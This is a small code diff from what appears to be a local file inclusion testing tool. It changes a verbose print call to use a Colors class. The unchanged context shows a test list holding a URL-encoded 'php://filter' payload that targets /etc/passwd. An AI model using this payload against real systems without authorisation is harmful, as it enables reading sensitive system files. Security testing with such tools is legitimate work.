@@ -12,7 +12,7 @@ def test_filter(url, post):
     """Test Filter"""
     args  = init_args()
     if args['verbose']:
-        print(colors.blue("[i]") + " Testing with filter wrapper...", flush = True)
+        print(colors.Colors().blue("[i]") + " Testing with filter wrapper...", flush = True)
 
     tests = []
     tests.append("php%3A%2F%2Ffilter%2Fresource%3D%2Fetc%2Fpasswd")
